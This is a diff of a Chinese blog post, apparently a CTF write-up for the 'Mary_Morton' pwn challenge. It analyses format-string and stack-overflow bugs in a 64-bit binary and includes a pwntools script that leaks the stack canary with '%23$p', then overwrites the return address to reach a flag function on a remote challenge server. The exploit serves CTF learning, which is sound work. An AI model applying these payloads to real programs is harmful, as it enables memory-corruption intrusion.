@@ -16,16 +16,21 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta name="description" content="9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！  file查看文件属性，elf64位文件 checksec查看保护机制">
+    <meta name="description" content="9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！ 查文件 file查看文件属性，elf64位文件 checksec查看保护机制   64位文件； 开启了Partial RELRO，表示got表可写； 开启了NX，栈不可执行； 无PIE； 开启了canary，不能直接栈溢出覆盖返回地址，因为在初始化一个栈帧时在栈底设置一个随机的canary值，函数">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界-Mary_Morton">
 <meta property="og:url" content="https://sinky.top/2022/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Mary_Morton/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
-<meta property="og:description" content="9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！  file查看文件属性，elf64位文件 checksec查看保护机制">
+<meta property="og:description" content="9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！ 查文件 file查看文件属性，elf64位文件 checksec查看保护机制   64位文件； 开启了Partial RELRO，表示got表可写； 开启了NX，栈不可执行； 无PIE； 开启了canary，不能直接栈溢出覆盖返回地址，因为在初始化一个栈帧时在栈底设置一个随机的canary值，函数">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://s2.loli.net/2022/11/08/A87ktmN1Sy5g9QJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/11/09/WlYMdrTOVoR5kvD.png">
+<meta property="og:image" content="https://s2.loli.net/2022/11/09/tFhGesgyKAc3CYm.png">
+<meta property="og:image" content="https://s2.loli.net/2022/11/09/ftOmIBaWVwlAzcN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/11/09/fhgGbe9mZs5oNI4.png">
+<meta property="og:image" content="https://s2.loli.net/2022/11/09/sDH8EhMNtwgQB29.png">
 <meta property="article:published_time" content="2022-11-08T08:24:16.075Z">
-<meta property="article:modified_time" content="2022-11-09T01:21:12.398Z">
+<meta property="article:modified_time" content="2022-11-10T05:30:42.846Z">
 <meta property="article:author" content="Sinky">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="CTF">
@@ -226,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          83 words
+          3.2k words
         
       </span>
     
@@ -237,7 +242,7 @@
         
         
         
-          1 mins
+          28 mins
         
       </span>
     
@@ -281,11 +286,71 @@
               <div class="markdown-body">
                 
                 <p>9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！</p>
-<ol>
+<h1 id="查文件"><a href="#查文件" class="headerlink" title="查文件"></a>查文件</h1><ol>
 <li>file查看文件属性，elf64位文件</li>
 <li>checksec查看保护机制</li>
 </ol>
 <p><img src="https://s2.loli.net/2022/11/08/A87ktmN1Sy5g9QJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>64位文件；</p>
+<p>开启了Partial RELRO，表示got表可写；</p>
+<p>开启了NX，栈不可执行；</p>
+<p>无PIE；</p>
+<p>开启了canary，不能直接栈溢出覆盖返回地址，因为在初始化一个栈帧时在栈底设置一个随机的canary值，函数返回之时会检测canary是否改变。</p>
+<p>运行程序</p>
+<p><img src="https://s2.loli.net/2022/11/09/WlYMdrTOVoR5kvD.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>1-栈溢出漏洞；2-格式化字符串漏洞；3-退出</p>
+<h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p>IDA打开找到main函数：</p>
+<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)<br>{<br>  int v3; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">24</span>h] [bp-Ch]@<span class="hljs-number">2</span><br>  __int64 v4; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">28</span>h] [bp-<span class="hljs-number">8</span>h]@<span class="hljs-number">1</span><br>  v4 = *MK_FP(__FS__, <span class="hljs-number">40</span>LL);<br>  sub_4009FF();<br>  puts(<span class="hljs-string">"Welcome to the battle ! "</span>);<br>  puts(<span class="hljs-string">"[Great Fairy] level pwned "</span>);<br>  puts(<span class="hljs-string">"Select your weapon "</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      sub_4009DA();<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v3);                <span class="hljs-regexp">//</span> 选择项 <span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span><br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      sub_4008EB();                             <span class="hljs-regexp">//</span> printf 格式化字符串<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>    {<br>      puts(<span class="hljs-string">"Bye "</span>);<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>      sub_400960();                             <span class="hljs-regexp">//</span> 触发canary，含栈溢出<br>    <span class="hljs-keyword">else</span><br>      puts(<span class="hljs-string">"Wrong!"</span>);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p>格式化字符串：</p>
+<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 sub<span class="hljs-constructor">_4008EB()</span><br>{<br>  <span class="hljs-built_in">char</span> buf; <span class="hljs-comment">// [sp+0h] [bp-90h]@1</span><br>  __int64 v2; <span class="hljs-comment">// [sp+88h] [bp-8h]@1</span><br>  v2 = *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 0x28LL)</span>;                  <span class="hljs-comment">// 从位置FS:[0x28u]读取双字内容</span><br>  memset(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);<br>  printf(&amp;buf, &amp;buf);<br>  return *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 40LL)</span> ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p>栈溢出：</p>
+<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">__int64 sub_40096<span class="hljs-number">0</span>()<br>{<br>  char buf; <span class="hljs-regexp">//</span> [sp+0h] [bp-<span class="hljs-number">90</span>h]@1<br>  __int64 v2; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">88</span>h] [bp-<span class="hljs-number">8</span>h]@1<br>  v2 = *MK_FP(__FS_<span class="hljs-number">_</span>, <span class="hljs-number">0x28</span>LL);                  <span class="hljs-regexp">//</span> canary标志<br>  memset(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-keyword">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>uLL);                      <span class="hljs-regexp">//</span> 栈溢出<br>  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"-&gt; %s\n"</span>, &amp;buf);<br>  <span class="hljs-keyword">return</span> *MK_FP(__FS_<span class="hljs-number">_</span>, <span class="hljs-number">40</span>LL) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p>查看流程图：</p>
+<p><img src="https://s2.loli.net/2022/11/09/tFhGesgyKAc3CYm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>分析可知<code>v2 = *MK_FP(__FS__, 0x28LL);</code>有canary保护，只有rax与fs:28h相等，才能跳转到返回值，反之则调用<code>stak_chk_fail</code></p>
+<p>查看字符串发现有 cat flag:</p>
+<p><img src="https://s2.loli.net/2022/11/09/ftOmIBaWVwlAzcN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>地址：<code>0x4008DA</code></p>
+<p>思路：</p>
+<p>利用字符串漏洞泄露canary值，在函数返回的时候再填回去，然后利用栈溢出让其返回后门函数。</p>
+<p>（我的IDA不知道为什么解析不出来这个函数体，不过应该问题不大）</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>先测一下字符串漏洞的偏移，payload一般为：</p>
+<pre><code class="hljs">AAAA-%x-%x-%x-%x…
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/09/fhgGbe9mZs5oNI4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>偏移了6个字节。</p>
+<p>canary与输入参数之间的偏移：</p>
+<p><img src="https://s2.loli.net/2022/11/09/sDH8EhMNtwgQB29.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>计算泄露特定地址的payload一般构造为</p>
+<pre><code class="hljs">(target_addr - start_addr + offset) / address_bytes_length（64位为8，32位为4）
+</code></pre>
+<p>buf和v2相差： 0x90-0x8=0x88,0x88/8=17,17+6=23</p>
+<ul>
+<li>64位程序，一个字符占8字节（32位是4字节），所以buf和v2相差0x88，转十进制为136，除以8，即相差17个字节</li>
+<li>由于buf是格式化字符串的第6个参数，所以v2是格式化字符串的第17+6=23个参数。</li>
+</ul>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-comment"># 导入pwn模块</span><br>p=remote(<span class="hljs-string">'61.147.171.105'</span>,<span class="hljs-number">53266</span>)<br> <span class="hljs-comment"># 远程交互</span><br>p.sendlineafter(<span class="hljs-string">'3. Exit the battle'</span>,<span class="hljs-string">'2'</span>)<br> <span class="hljs-comment"># 在接收到`3. Exit`后输入2进入格式化字符串漏洞环节</span><br>p.sendline(<span class="hljs-string">'%23$p'</span>)<br> <span class="hljs-comment"># 发送%23$p,让程序输出canary的值 (不明白为什么23位是这样写的)</span><br>p.recvuntil(<span class="hljs-string">'0x'</span>)<br> <span class="hljs-comment"># 读到0x出现为止</span><br>canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br> <span class="hljs-comment"># canary接收整型16字节数</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">"canary:  "</span> + <span class="hljs-built_in">hex</span>(canary)<br> <span class="hljs-comment"># canary转十六进制</span><br>flag_addr=<span class="hljs-number">0x4008da</span><br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>+p64(flag_addr)<br> <span class="hljs-comment"># 用a填充相差的0x88，跟上第23位的canary值，加上flag地址，最后64位对其填上a*8</span><br>p.sendlineafter(<span class="hljs-string">'3. Exit the battle'</span>,<span class="hljs-string">'1'</span>)<br> <span class="hljs-comment"># 读到3.Exit之后输入1 进入栈溢出环节</span><br>p.sendline(payload)<br> <span class="hljs-comment"># 发送payload</span><br>p.interactive()<br> <span class="hljs-comment"># 结束交互</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p>（题目描述说是非常简单的热身pwn，呵呵）</p>
+<h1 id="拓展：canary"><a href="#拓展：canary" class="headerlink" title="拓展：canary"></a>拓展：canary</h1><p>对于64位程序，在开始运行时，就会随机生成canary，存放在 TLS结构体 tcbhead_t 偏移为 0x28 的位置，带有缓冲区的函数在函数开头就会利于 FS指针 从该位置取出canary的值将其置于 rbp-0x8 的位置，在函数返回时，就会比较 FS[0x28] 里原本的canary和栈上的canary，若相等，程序继续向下执行；若不相等，进入处理栈溢出的函数—— stack_chk_fail,它会让程序终止并且抛出报错 “stack smahing detected”</p>
+<h1 id="拓展：格式化字符串漏洞"><a href="#拓展：格式化字符串漏洞" class="headerlink" title="拓展：格式化字符串漏洞"></a>拓展：格式化字符串漏洞</h1><p>虽然之前有写过笔记，但是忘记了，所以再记录一遍。</p>
+<p>在C语言中的printf,fprintf,sprintf,snprintf等print函数等用到类似<code>%</code>形式的一个或多个说明符，例如<code>printf("I am %s",lihua);</code></p>
+<p>第一个参数就是格式化字符串，它主要依靠一个可以用来告诉程序如何进行格式化输出的说明符。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>原理就是程序员偷懒将格式化字符串操作全交给了用户，产生任意地址读写的漏洞。</p>
+<p>正确的函数：</p>
+<pre><code class="hljs">char str[100];
+scanf("%s",str);
+printf("%s",str);
+</code></pre>
+<p>有漏洞的函数：</p>
+<pre><code class="hljs">char str[100];
+scanf("%s",str);
+printf(str);
+</code></pre>
+<p>因为printf函数是可变参数的函数，如果用户输入参数位<code>%x</code>，那么就会输出内存中的数据，因为没有指定参数个数，没有限制输出类型，所以程序遇到<code>%</code>就会根据相应的规则去取相应的参数，直到检索到格式化字符串结束，造成内存泄露。</p>
 
                 
               </div>
@@ -367,8 +432,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/08/Linux%E4%B8%8B%E6%90%AD%E5%BB%BAVulhub%E9%9D%B6%E5%9C%BA/" title="Linux下搭建Vulhub靶场">
-                        <span class="hidden-mobile">Linux下搭建Vulhub靶场</span>
+                      <a href="/2022/11/08/Web%E6%94%BB%E9%98%B2%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/" title="Web攻防业务安全实战指南笔记">
+                        <span class="hidden-mobile">Web攻防业务安全实战指南笔记</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
